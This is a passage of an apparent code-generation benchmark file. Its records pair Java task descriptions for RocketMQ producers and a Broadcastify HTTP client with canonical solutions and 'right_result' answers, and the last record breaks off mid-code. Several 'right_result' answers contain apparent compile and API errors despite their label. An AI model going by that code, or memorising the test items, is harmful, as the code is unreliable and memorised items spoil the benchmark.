}\n}\n```"
  },
  {
    "Task_id": 383,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ message producer sink for sending messages to RocketMQ topics, supporting both synchronous and asynchronous message delivery, batch processing, and configurable message delay levels.\n\nClass Description: The RocketMQSink class is a Flink-compatible sink that sends messages to RocketMQ. It handles message serialization, topic selection, and provides configurable message delivery options including synchronous/asynchronous sending, batch processing, and delayed message delivery.\n\nAttributes:\n- LOG: Logger - Logger instance for logging debug and error messages\n- producer: DefaultMQProducer - RocketMQ producer instance for sending messages\n- async: boolean - Flag indicating whether to use asynchronous message sending\n- props: Properties - Configuration properties for the producer\n- topicSelector: TopicSelector<IN> - Selector for determining message topics and tags\n- serializationSchema: KeyValueSerializationSchema<IN> - Schema for serializing input data\n- batchFlushOnCheckpoint: boolean - Flag indicating whether to use batch processing\n- batchSize: int - Maximum batch size for batch processing\n- batchList: List<Message> - Buffer for batch messages\n- messageDeliveryDelayLevel: int - Configuration for delayed message delivery\n\nMethods:\n- RocketMQSink(KeyValueSerializationSchema<IN>, TopicSelector<IN>, Properties) -> void - Constructor that initializes the sink with serialization schema, topic selector, and configuration properties\n- open(Configuration) -> void - Initializes the RocketMQ producer and prepares for message sending\n- invoke(IN) -> void - Processes and sends a single message (either immediately or adds to batch)\n- prepareMessage(IN) -> Message - Creates a RocketMQ Message object from input data\n- close() -> void - Cleans up resources and shuts down the producer\n- flushSync() -> void - Sends all batched messages synchronously (used when batch processing is enabled)",
    "Canonical_solution": "import com.zhisheng.connectors.rocketmq.common.selector.TopicSelector;\nimport com.zhisheng.connectors.rocketmq.common.serialization.KeyValueSerializationSchema;\nimport org.apache.commons.lang3.Validate;\nimport org.apache.flink.configuration.Configuration;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendCallback;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.nio.charset.StandardCharsets;\nimport java.util.LinkedList;\nimport java.util.List;\nimport java.util.Properties;\n\npublic class RocketMQSink<IN> {\n    private static final Logger LOG = LoggerFactory.getLogger(RocketMQSink.class);\n\n    private transient DefaultMQProducer producer;\n    private boolean async;\n    private Properties props;\n    private TopicSelector<IN> topicSelector;\n    private KeyValueSerializationSchema<IN> serializationSchema;\n    private boolean batchFlushOnCheckpoint;\n    private int batchSize = 1000;\n    private List<Message> batchList;\n    private int messageDeliveryDelayLevel;\n\n    public RocketMQSink(KeyValueSerializationSchema<IN> schema, TopicSelector<IN> topicSelector, Properties props) {\n        this.serializationSchema = schema;\n        this.topicSelector = topicSelector;\n        this.props = props;\n        this.messageDeliveryDelayLevel = RocketMQUtils.getInteger(this.props, RocketMQConfig.MSG_DELAY_LEVEL,\n                RocketMQConfig.MSG_DELAY_LEVEL00);\n        if (this.messageDeliveryDelayLevel < RocketMQConfig.MSG_DELAY_LEVEL00) {\n            this.messageDeliveryDelayLevel = RocketMQConfig.MSG_DELAY_LEVEL00;\n        } else if (this.messageDeliveryDelayLevel > RocketMQConfig.MSG_DELAY_LEVEL18) {\n            this.messageDeliveryDelayLevel = RocketMQConfig.MSG_DELAY_LEVEL18;\n        }\n    }\n\n    public void open(Configuration parameters) throws Exception {\n        Validate.notEmpty(props, \"Producer properties can not be empty\");\n        Validate.notNull(topicSelector, \"TopicSelector can not be null\");\n        Validate.notNull(serializationSchema, \"KeyValueSerializationSchema can not be null\");\n\n        producer = new DefaultMQProducer();\n        producer.setInstanceName(String.valueOf(getRuntimeContext().getIndexOfThisSubtask()));\n        RocketMQConfig.buildProducerConfigs(props, producer);\n        batchList = new LinkedList<>();\n\n        try {\n            producer.start();\n        } catch (MQClientException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public void invoke(IN input) throws Exception {\n        Message msg = prepareMessage(input);\n\n        if (batchFlushOnCheckpoint) {\n            batchList.add(msg);\n            if (batchList.size() >= batchSize) {\n                flushSync();\n            }\n            return;\n        }\n\n        if (async) {\n            try {\n                producer.send(msg, new SendCallback() {\n                    @Override\n                    public void onSuccess(SendResult sendResult) {\n                        LOG.debug(\"Async send message success! result: {}\", sendResult);\n                    }\n\n                    @Override\n                    public void onException(Throwable throwable) {\n                        if (throwable != null) {\n                            LOG.error(\"Async send message failure!\", throwable);\n                        }\n                    }\n                });\n            } catch (Exception e) {\n                LOG.error(\"Async send message failure!\", e);\n            }\n        } else {\n            try {\n                SendResult result = producer.send(msg);\n                LOG.debug(\"Sync send message result: {}\", result);\n            } catch (Exception e) {\n                LOG.error(\"Sync send message failure!\", e);\n            }\n        }\n    }\n\n    private Message prepareMessage(IN input) {\n        String topic = topicSelector.getTopic(input);\n        String tag = topicSelector.getTag(input) != null ? topicSelector.getTag(input) : \"\";\n\n        byte[] k = serializationSchema.serializeKey(input);\n        String key = k != null ? new String(k, StandardCharsets.UTF_8) : \"\";\n        byte[] value = serializationSchema.serializeValue(input);\n\n        Validate.notNull(topic, \"the message topic is null\");\n        Validate.notNull(value, \"the message body is null\");\n\n        Message msg = new Message(topic, tag, key, value);\n        if (this.messageDeliveryDelayLevel > RocketMQConfig.MSG_DELAY_LEVEL00) {\n            msg.setDelayTimeLevel(this.messageDeliveryDelayLevel);\n        }\n        return msg;\n    }\n\n    public void close() throws Exception {\n        if (producer != null) {\n            flushSync();\n            producer.shutdown();\n        }\n    }\n\n    private void flushSync() throws Exception {\n        if (batchFlushOnCheckpoint) {\n            synchronized (batchList) {\n                if (batchList.size() > 0) {\n                    producer.send(batchList);\n                    batchList.clear();\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "right_result": "```java\nimport org.apache.flink.configuration.Configuration;\nimport org.apache.flink.streaming.api.functions.sink.SinkFunction;\nimport org.apache.flink.util.Preconditions;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendCallback;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.io.IOException;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Properties;\n\npublic class RocketMQSink<IN> implements SinkFunction<IN> {\n\n    private static final long serialVersionUID = 1L;\n    private static final Logger LOG = LoggerFactory.getLogger(RocketMQSink.class);\n\n    private transient DefaultMQProducer producer;\n    private final boolean async;\n    private final Properties props;\n    private final TopicSelector<IN> topicSelector;\n    private final KeyValueSerializationSchema<IN> serializationSchema;\n    private final boolean batchFlushOnCheckpoint;\n    private final int batchSize;\n    private final List<Message> batchList;\n    private final int messageDeliveryDelayLevel;\n\n    public RocketMQSink(\n            KeyValueSerializationSchema<IN> serializationSchema,\n            TopicSelector<IN> topicSelector,\n            Properties properties) {\n        this.serializationSchema = Preconditions.checkNotNull(serializationSchema, \"serializationSchema must not be null\");\n        this.topicSelector = Preconditions.checkNotNull(topicSelector, \"topicSelector must not be null\");\n        this.props = Preconditions.checkNotNull(properties, \"properties must not be null\");\n\n        this.async = Boolean.parseBoolean(props.getProperty(\"async\", \"false\"));\n        this.batchFlushOnCheckpoint = Boolean.parseBoolean(props.getProperty(\"batch.flush.on.checkpoint\", \"true\"));\n        this.batchSize = Integer.parseInt(props.getProperty(\"batch.size\", \"100\"));\n        this.messageDeliveryDelayLevel = Integer.parseInt(props.getProperty(\"message.delay.level\", \"0\"));\n\n        this.batchList = new ArrayList<>(batchSize);\n    }\n\n    @Override\n    public void open(Configuration parameters) throws Exception {\n        super.open(parameters);\n        String producerGroup = props.getProperty(\"producer.group\");\n        String namesrvAddr = props.getProperty(\"namesrv.addr\");\n\n        if (producerGroup == null || namesrvAddr == null) {\n            throw new IOException(\"Missing required configuration: producer.group and namesrv.addr must be provided.\");\n        }\n\n        producer = new DefaultMQProducer(producerGroup);\n        producer.setNamesrvAddr(namesrvAddr);\n        producer.start();\n    }\n\n    @Override\n    public void invoke(IN value) {\n        Message msg = prepareMessage(value);\n        if (batchFlushOnCheckpoint && batchList.size() < batchSize) {\n            batchList.add(msg);\n        } else {\n            send(msg);\n        }\n    }\n\n    private Message prepareMessage(IN value) {\n        try {\n            String topic = topicSelector.selectTopic(value);\n            String tag = topicSelector.selectTag(value);\n            byte[] body = serializationSchema.serializeKeyAndValue(value);\n            Message msg = new Message(topic, tag, body);\n            if (messageDeliveryDelayLevel > 0) {\n                msg.setDelayTimeLevel(messageDeliveryDelayLevel);\n            }\n            return msg;\n        } catch (Exception e) {\n            LOG.error(\"Failed to prepare message for input: {}\", value, e);\n            throw new RuntimeException(e);\n        }\n    }\n\n    private void send(Message msg) {\n        if (async) {\n            producer.send(msg, new SendCallback() {\n                @Override\n                public void onSuccess(SendResult sendResult) {\n                    LOG.debug(\"Message sent asynchronously with result: {}\", sendResult);\n                }\n\n                @Override\n                public void onException(Throwable throwable) {\n                    LOG.error(\"Failed to send message asynchronously\", throwable);\n                }\n            });\n        } else {\n            try {\n                SendResult sendResult = producer.send(msg);\n                LOG.debug(\"Message sent synchronously with result: {}\", sendResult);\n            } catch (MQClientException | InterruptedException e) {\n                LOG.error(\"Failed to send message synchronously\", e);\n            }\n        }\n    }\n\n    @Override\n    public void close() {\n        if (producer != null) {\n            producer.shutdown();\n        }\n        flushBatch();\n    }\n\n    private void flushBatch() {\n        if (!batchList.isEmpty()) {\n            for (Message msg : batchList) {\n                send(msg);\n            }\n            batchList.clear();\n        }\n    }\n\n    public void flushSync() {\n        flushBatch();\n    }\n}\n```"
  },
  {
    "Task_id": 384,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ producer capable of sending ordered messages to specified topics with tags, while maintaining message order based on an order ID.\n\nClass Description: The Producer class encapsulates the functionality of a RocketMQ message producer. It handles initialization, message sending with ordering guarantees, and resource cleanup. The class uses RocketMQ's DefaultMQProducer to send messages to a specified topic, with the ability to maintain message order through a custom MessageQueueSelector.\n\nAttributes:\n- producer: DefaultMQProducer - The core RocketMQ producer instance responsible for sending messages\n- producerGroup: String (implicit) - The producer group name passed to the constructor\n- namesrvAddr: String (implicit) - The NameServer address passed to the constructor\n\nMethods:\n- Constructor: Producer(String producerGroup, String namesrvAddr) -> void - Initializes the producer with the given group name and NameServer address\n- start: start() -> void - Starts the producer instance to begin sending messages\n- shutdown: shutdown() -> void - Shuts down the producer instance and releases resources\n- sendOrderedMessage: sendOrderedMessage(String topic, String[] tags, String key, String body, int orderId) -> SendResult - Sends an ordered message to the specified topic with the given tags, key, and body, using the orderId to maintain message order",
    "Canonical_solution": "import org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.MessageQueueSelector;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.common.message.MessageQueue;\nimport org.apache.rocketmq.remoting.common.RemotingHelper;\n\nimport java.io.UnsupportedEncodingException;\nimport java.util.List;\n\npublic class Producer {\n\n    private DefaultMQProducer producer;\n\n    public Producer(String producerGroup, String namesrvAddr) {\n        this.producer = new DefaultMQProducer(producerGroup);\n        this.producer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void start() throws Exception {\n        producer.start();\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n\n    public SendResult sendOrderedMessage(String topic, String[] tags, String key, String body, int orderId) \n        throws Exception {\n        Message msg = new Message(topic, tags[orderId % tags.length], key,\n            body.getBytes(RemotingHelper.DEFAULT_CHARSET));\n        \n        SendResult sendResult = producer.send(msg, new MessageQueueSelector() {\n            @Override\n            public MessageQueue select(List<MessageQueue> mqs, Message msg, Object arg) {\n                Integer id = (Integer) arg;\n                int index = id % mqs.size();\n                return mqs.get(index);\n            }\n        }, orderId);\n\n        return sendResult;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "right_result": "```java\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.MessageQueueSelector;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.common.message.MessageQueue;\n\nimport java.util.List;\n\npublic class Producer {\n    private final DefaultMQProducer producer;\n\n    public Producer(String producerGroup, String namesrvAddr) {\n        this.producer = new DefaultMQProducer(producerGroup);\n        this.producer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void start() throws MQClientException {\n        producer.start();\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n\n    public SendResult sendOrderedMessage(String topic, String[] tags, String key, String body, int orderId) throws MQClientException {\n        Message msg = new Message(topic, tags[0], key.getBytes(), body.getBytes());\n        return producer.send(msg, new MessageQueueSelector() {\n            @Override\n            public MessageQueue select(List<MessageQueue> mqs, Message msg, Object arg) {\n                int id = (Integer) arg;\n                int index = id % mqs.size();\n                return mqs.get(index);\n            }\n        }, orderId);\n    }\n}\n```"
  },
  {
    "Task_id": 385,
    "Instruction": "Task Description: Create a Java class that implements a simple RocketMQ producer to send messages to a specified topic.\n\nClass Description: The SimpleProducer class provides basic functionality to send messages to a RocketMQ broker. It handles producer initialization, message sending, and cleanup.\n\nAttributes:\n- producer: DefaultMQProducer - The RocketMQ producer instance that handles message sending operations\n\nMethods:\n- SimpleProducer(String producerGroup, String namesrvAddr) -> Constructor - Initializes the producer with the specified producer group and NameServer address\n- start() -> void - Starts the producer instance to begin sending messages\n- sendMessage(String topic, String tags, String keys, byte[] body) -> void - Creates and sends a message with the specified topic, tags, keys, and body content\n- shutdown() -> void - Shuts down the producer instance and releases resources",
    "Canonical_solution": "import org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.common.message.Message;\n\npublic class SimpleProducer {\n    private DefaultMQProducer producer;\n\n    public SimpleProducer(String producerGroup, String namesrvAddr) {\n        producer = new DefaultMQProducer(producerGroup);\n        producer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void start() throws MQClientException {\n        producer.start();\n    }\n\n    public void sendMessage(String topic, String tags, String keys, byte[] body) throws Exception {\n        Message msg = new Message(topic, tags, keys, body);\n        producer.send(msg);\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "right_result": "```java\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.common.message.Message;\n\npublic class SimpleProducer {\n    private DefaultMQProducer producer;\n\n    public SimpleProducer(String producerGroup, String namesrvAddr) {\n        this.producer = new DefaultMQProducer(producerGroup);\n        this.producer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void start() {\n        producer.start();\n    }\n\n    public void sendMessage(String topic, String tags, String keys, byte[] body) throws MQClientException {\n        Message msg = new Message(topic, tags, keys.getBytes(), body);\n        producer.send(msg);\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n}\n```"
  },
  {
    "Task_id": 386,
    "Instruction": "Task Description: Create a Java function that demonstrates how to use RocketMQ's producer to send messages to a specified topic with ACL authentication.\n\nFunction Description: This function creates and configures a RocketMQ producer with ACL authentication, sends multiple messages to a specified topic, and then shuts down the producer. It demonstrates the basic workflow of message production including producer initialization, message creation, message sending, and resource cleanup.\n\nInput: None (The function uses predefined constants for configuration)\n\nOutput: None (The function prints send results to console but doesn't return any value)\n\nMethods:\n\nproducer: producer() -> void - Main function that creates and configures the producer, sends messages, and handles shutdown\ngetAclRPCHook: getAclRPCHook() -> RPCHook - Helper function that creates and returns an ACL authentication hook using predefined credentials",
    "Canonical_solution": "import org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.remoting.common.RemotingHelper;\nimport org.apache.rocketmq.acl.common.AclClientRPCHook;\nimport org.apache.rocketmq.acl.common.SessionCredentials;\nimport org.apache.rocketmq.remoting.RPCHook;\n\nprivate static final String ACL_ACCESS_KEY = \"RocketMQ\";\nprivate static final String ACL_SECRET_KEY = \"1234567\";\n\npublic static void producer() throws MQClientException {\n    DefaultMQProducer producer = new DefaultMQProducer(\"ProducerGroupName\", getAclRPCHook());\n    producer.setNamesrvAddr(\"127.0.0.1:9876\");\n    producer.start();\n\n    for (int i = 0; i < 128; i++)\n        try {\n            {\n                Message msg = new Message(\"TopicTest\",\n                    \"TagA\",\n                    \"OrderID188\",\n                    \"Hello world\".getBytes(RemotingHelper.DEFAULT_CHARSET));\n                SendResult sendResult = producer.send(msg);\n                System.out.printf(\"%s%n\", sendResult);\n            }\n\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n\n    producer.shutdown();\n}\n\nstatic RPCHook getAclRPCHook() {\n    return new AclClientRPCHook(new SessionCredentials(ACL_ACCESS_KEY,ACL_SECRET_KEY));\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 42,
    "right_result": "```java\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.remoting.RPCHook;\nimport org.apache.rocketmq.remoting.common.RemotingHelper;\nimport org.apache.rocketmq.acl.common.AclClientRPCHook;\nimport org.apache.rocketmq.acl.common.SessionCredentials;\n\npublic class RocketMQProducerExample {\n\n    private static final String NAMESRV_ADDR = \"localhost:9876\";\n    private static final String TOPIC = \"TestTopic\";\n    private static final String ACCESS_KEY = \"yourAccessKey\";\n    private static final String SECRET_KEY = \"yourSecretKey\";\n\n    public void producer() throws MQClientException, InterruptedException {\n        DefaultMQProducer producer = new DefaultMQProducer(\"ProducerGroup\");\n        producer.setNamesrvAddr(NAMESRV_ADDR);\n        RPCHook rpcHook = getAclRPCHook();\n        producer.setRpcHook(rpcHook);\n\n        producer.start();\n\n        for (int i = 0; i < 5; i++) {\n            Message msg = new Message(TOPIC, (\"Hello RocketMQ \" + i).getBytes(RemotingHelper.DEFAULT_CHARSET));\n            try {\n                producer.send(msg);\n                System.out.printf(\"Sent message: %s%n\", new String(msg.getBody(), RemotingHelper.DEFAULT_CHARSET));\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n\n        producer.shutdown();\n    }\n\n    private RPCHook getAclRPCHook() {\n        SessionCredentials sessionCredentials = new SessionCredentials(ACCESS_KEY, SECRET_KEY.getBytes());\n        return new AclClientRPCHook(sessionCredentials);\n    }\n\n    public static void main(String[] args) {\n        RocketMQProducerExample example = new RocketMQProducerExample();\n        try {\n            example.producer();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 387,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ producer for sending order-related messages to a specified topic.\n\nClass Description: The OrderProducer class is a Spring component that initializes and manages a RocketMQ producer instance. It provides methods to send test order messages and actual order objects to a configured RocketMQ topic.\n\nAttributes:\n- producer: DefaultMQProducer - The RocketMQ producer instance\n- namesrvAddr: String - The address of the RocketMQ NameServer (injected from properties)\n- topicName: String - The target topic name for messages (injected from properties)\n\nMethods:\n- init(): void - Initializes the producer instance with configuration settings and starts it. Uses @PostConstruct to ensure initialization after dependency injection.\n- send(): void - Sends 100 test order messages to the configured topic with incrementing tags.\n- send(HOrder order): boolean - Sends a serialized order object to the configured topic, using the order ID in the message tag. Returns true if sent successfully, false otherwise.\n\nInput:\n- For send(): None\n- For send(HOrder order): order - An HOrder object representing the order to be sent\n\nOutput:\n- For send(): None\n- For send(HOrder order): boolean - Indicates whether the message was successfully sent (true) or not (false)",
    "Canonical_solution": "import com.alibaba.fastjson2.JSON;\nimport com.camp.promotion.entity.HOrder;\nimport org.apache.rocketmq.client.exception.MQBrokerException;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.client.producer.SendStatus;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.remoting.exception.RemotingException;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\nimport javax.annotation.PostConstruct;\nimport java.nio.charset.StandardCharsets;\n\n@Component\npublic class OrderProducer {\n\n    private DefaultMQProducer producer;\n\n    @Value(\"${rocketmq.nameserver.addr}\")\n    private String namesrvAddr;\n\n    @Value(\"${rocketmq.topic.name}\")\n    private String topicName;\n\n    @PostConstruct\n    public void init() throws MQClientException {\n        producer = new DefaultMQProducer();\n        producer.setProducerGroup(\"create_order_producer_group\");\n        producer.setNamesrvAddr(namesrvAddr);\n        producer.setRetryTimesWhenSendFailed(3);\n        producer.setSendMsgTimeout(1000);\n        producer.start();\n    }\n\n    public void send() {\n        try {\n            for (int i = 0; i < 100; i++) {\n                String body = \"TEST_ORDER_\" + i;\n                Message message = new Message(topicName, \"create_order\" + i, body.getBytes(StandardCharsets.UTF_8));\n                SendResult sendResult = producer.send(message);\n            }\n        } catch (MQBrokerException | MQClientException | RemotingException | InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public boolean send(HOrder order) {\n        byte[] body = JSON.toJSONBytes(order);\n        Message message = new Message(topicName, \"create_order\" + order.getId(), body);\n        SendResult sendResult;\n        try {\n            sendResult = producer.send(message);\n        } catch (MQClientException | RemotingException | MQBrokerException | InterruptedException e) {\n            return false;\n        }\n        return sendResult.getSendStatus() == SendStatus.SEND_OK;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "right_result": "```java\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.common.message.Message;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\nimport javax.annotation.PostConstruct;\nimport java.util.concurrent.TimeUnit;\n\n@Component\npublic class OrderProducer {\n\n    private DefaultMQProducer producer;\n\n    @Value(\"${rocketmq.namesrv.addr}\")\n    private String namesrvAddr;\n\n    @Value(\"${rocketmq.topic.order}\")\n    private String topicName;\n\n    @PostConstruct\n    public void init() throws MQClientException {\n        producer = new DefaultMQProducer(\"OrderProducerGroup\");\n        producer.setNamesrvAddr(namesrvAddr);\n        producer.start();\n    }\n\n    public void send() {\n        for (int i = 0; i < 100; i++) {\n            Message msg = new Message(topicName, \"Tag\" + i % 10, (\"TestOrder-\" + i).getBytes());\n            try {\n                producer.send(msg);\n                Thread.sleep(100);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public boolean send(HOrder order) {\n        try {\n            Message msg = new Message(topicName, \"OrderId_\" + order.getId(), serialize(order).getBytes());\n            producer.send(msg);\n            return true;\n        } catch (Exception e) {\n            e.printStackTrace();\n            return false;\n        }\n    }\n\n    private String serialize(HOrder order) {\n        return \"Order{\"\n                + \"id=\" + order.getId()\n                + \", customerId=\" + order.getCustomerId()\n                + \", amount=\" + order.getAmount()\n                + \"}\";\n    }\n}\n```"
  },
  {
    "Task_id": 389,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ producer to send messages to a RocketMQ broker.\n\nClass Description: The RocketMQProducer class encapsulates the functionality for sending messages to a RocketMQ message broker. It handles producer initialization, message sending, and resource cleanup.\n\nAttributes:\n- producer: DefaultMQProducer - The RocketMQ producer instance that handles message sending operations\n\nMethods:\n- RocketMQProducer(String producerGroup, String namesrvAddr) -> void - Constructor that initializes the producer with a producer group and NameServer address. Starts the producer instance.\n- sendMessage(String topic, String tags, String keys, String body) -> SendResult - Creates and sends a message to the specified topic with given tags and keys. Returns the send result containing message status.\n- shutdown() -> void - Shuts down the producer instance and releases resources.\n\nInput:\n- Constructor parameters:\n  - producerGroup: String - The group name of the producer\n  - namesrvAddr: String - The address of the NameServer\n- sendMessage parameters:\n  - topic: String - The topic to send the message to\n  - tags: String - Tags for message filtering\n  - keys: String - The business key of the message\n  - body: String - The message content\n\nOutput:\n- sendMessage returns: SendResult - Contains information about the message sending operation\n- shutdown returns: void",
    "Canonical_solution": "import org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.client.producer.SendResult;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.remoting.common.RemotingHelper;\n\npublic class RocketMQProducer {\n\n    private DefaultMQProducer producer;\n\n    public RocketMQProducer(String producerGroup, String namesrvAddr) throws MQClientException {\n        producer = new DefaultMQProducer(producerGroup);\n        producer.setNamesrvAddr(namesrvAddr);\n        producer.start();\n    }\n\n    public SendResult sendMessage(String topic, String tags, String keys, String body) throws Exception {\n        Message msg = new Message(topic,\n                tags,\n                keys,\n                body.getBytes(RemotingHelper.DEFAULT_CHARSET));\n        return producer.send(msg);\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 42,
    "right_result": "```java\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.client.producer.DefaultMQProducer;\nimport org.apache.rocketmq.common.message.Message;\nimport org.apache.rocketmq.client.producer.SendResult;\n\npublic class RocketMQProducer {\n    private DefaultMQProducer producer;\n\n    public RocketMQProducer(String producerGroup, String namesrvAddr) throws MQClientException {\n        producer = new DefaultMQProducer(producerGroup);\n        producer.setNamesrvAddr(namesrvAddr);\n        producer.start();\n    }\n\n    public SendResult sendMessage(String topic, String tags, String keys, String body) throws MQClientException, InterruptedException {\n        Message msg = new Message(topic, tags, keys.getBytes(), body.getBytes());\n        return producer.send(msg);\n    }\n\n    public void shutdown() {\n        producer.shutdown();\n    }\n}\n```"
  },
  {
    "Task_id": 39,
    "Instruction": "Task Description: Create a Java class that implements HTTP client functionality for making synchronous and asynchronous HTTP requests, specifically designed for interacting with the Broadcastify API.\n\nClass Description: The BroadcastifyHttpClient class provides methods for testing API connections and sending asynchronous requests to the Broadcastify service. It uses Java's HttpClient for HTTP/2 communication with configurable timeout and redirect policies.\n\nAttributes:\n- mHttpClient: [HttpClient] - The underlying HTTP client instance configured with HTTP/2 support, 20-second timeout, and normal redirect policy\n\nMethods:\n- testConnection: [testConnection](BroadcastifyCallConfiguration configuration) -> String - Tests the connection to the Broadcastify API by sending a synchronous multipart/form-data POST request with API key, system ID, and test flag. Returns the response body with status code or error message.\n- sendAsyncRequest: [sendAsyncRequest](HttpRequest request) -> void - Sends an HTTP request asynchronously and handles the response or error in a completion callback. Successful responses (status 200) and errors are handled separately.",
    "Canonical_solution": "import java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.time.Duration;\n\npublic class BroadcastifyHttpClient {\n\n    private HttpClient mHttpClient = HttpClient.newBuilder()\n        .version(HttpClient.Version.HTTP_2)\n        .followRedirects(HttpClient.Redirect.NORMAL)\n        .connectTimeout(Duration.ofSeconds(20))\n        .build();\n\n    public String testConnection(BroadcastifyCallConfiguration configuration) {\n        BroadcastifyCallBuilder bodyBuilder = new BroadcastifyCallBuilder();\n        bodyBuilder.addPart(FormField.API_KEY, configuration.getApiKey())\n            .addPart(FormField.SYSTEM_ID, configuration.getSystemID())\n            .addPart(FormField.TEST, 1);\n\n        HttpRequest request = HttpRequest.newBuilder()\n            .uri(URI.create(configuration.getHost()))\n            .header(HttpHeaders.CONTENT_TYPE, MULTIPART_FORM_DATA + \"; boundary=\" + bodyBuilder.getBoundary())\n            .header(HttpHeaders.USER_AGENT, \"sdrtrunk\")\n            .header(HttpHeaders.ACCEPT, \"*/*\")\n            .POST(bodyBuilder.build())\n            .build();\n\n        HttpResponse.BodyHandler<String> responseHandler = HttpResponse.BodyHandlers.ofString();\n\n        try {\n            HttpResponse<String> response = mHttpClient.send(request, responseHandler);\n            String responseBody = response.body();\n            return (responseBody != null ? responseBody : \"(no response)\") + \" Status Code:\" + response.statusCode();\n        }\n        catch(Exception e) {\n            return e.getLocalizedMessage();\n        }\n    }\n\n    public void sendAsyncRequest(HttpRequest request) {\n        mHttpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString())\n            .whenComplete((response, throwable) -> {\n                if(throwable != null || response.statusCode() != 200) {\n                    if(!(throwable instanceof IOException || throwable instanceof CompletionException)) {\n                        // Handle non-I/O errors\n                    }\n                }\n                else {\n                    // Handle successful response\n                }\n            });\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 17,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.net.http.HttpRequest.BodyPublishers;\nimport java.net.http.HttpResponse.BodyHandlers;\nimport java.time.Duration;\nimport java.util.Map;\n\npublic class BroadcastifyHttpClient {\n    private final HttpClient mHttpClient;\n\n    public BroadcastifyHttpClient() {\n        mHttpClient = HttpClient.newBuilder()\n                .version(HttpClient.Version.HTTP_2)\n                .connectTimeout(Duration.ofSeconds(20))\n                .followRedirects(HttpClient.Redirect.NORMAL)\n                .build();\n    }\n\n    public String testConnection(BroadcastifyCallConfiguration configuration) {\n        try {\n            HttpRequest request = HttpRequest.newBuilder()\n                    .uri(URI.create(\"https://api.broadcastify.com/test\"))\n                    .header(\"Content-Type\", \"multipart/form-data\")\n                    .POST(BodyPublishers.ofString(\n                            \"apiKey=\" + configuration.getApiKey() +\n                                    \"&systemId=\" + configuration.getSystemId() +\n                                    \"&test=true\"))\n                    .build();\n\n            HttpResponse<String> 